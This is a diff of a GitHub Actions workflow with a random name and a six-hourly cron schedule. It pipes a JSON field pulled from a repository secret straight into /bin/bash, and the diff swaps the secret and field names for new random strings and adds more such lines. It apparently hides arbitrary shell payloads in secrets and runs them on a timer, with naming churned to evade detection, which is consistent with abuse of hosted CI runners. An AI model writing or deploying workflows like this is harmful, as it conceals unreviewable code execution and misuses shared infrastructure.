@@ -3,9 +3,9 @@ name: eihfual
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 3/6 * * *'
+    - cron: '44 0/6 * * *'
 
-jobs:  # 10103
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,15 +13,17 @@ jobs:  # 10103
       - uses: actions/checkout@v4
       - name: eihfual
         env:
-          k241: ${{ secrets.k241 }}
+          oj65: ${{ secrets.oj65 }}
         run: |
-          echo $k241 | jq -r .d253 | /bin/bash
-          echo $l7469 | jq -r .rptab073 | /bin/bash
-          echo $of4 | jq -r .gs28196 | /bin/bash
-          echo $timop2 | jq -r .q98582 | /bin/bash
-          echo $euo3 | jq -r .yjcyd5 | /bin/bash
-          echo $plag43 | jq -r .sp06 | /bin/bash
-          echo $vqc4 | jq -r .shzx586 | /bin/bash
-          echo $ur30289 | jq -r .hdbk15777 | /bin/bash
-          echo $unqhm27 | jq -r .g4 | /bin/bash
+          echo $oj65 | jq -r .o35 | /bin/bash
+          echo $xummd75983 | jq -r .r85602 | /bin/bash
+          echo $umvp6806 | jq -r .jnido60416 | /bin/bash
+          echo $bqnad9940 | jq -r .rn581 | /bin/bash
+          echo $yyih84093 | jq -r .t3 | /bin/bash
+          echo $adc1162 | jq -r .e03702 | /bin/bash
+          echo $vgkus08317 | jq -r .tvipd64 | /bin/bash
+          echo $y5 | jq -r .qagj4110 | /bin/bash
+          echo $tendu64 | jq -r .un2302 | /bin/bash
+          echo $rqn507 | jq -r .gkp178 | /bin/bash
+          echo $s988 | jq -r .zuf1 | /bin/bash
 
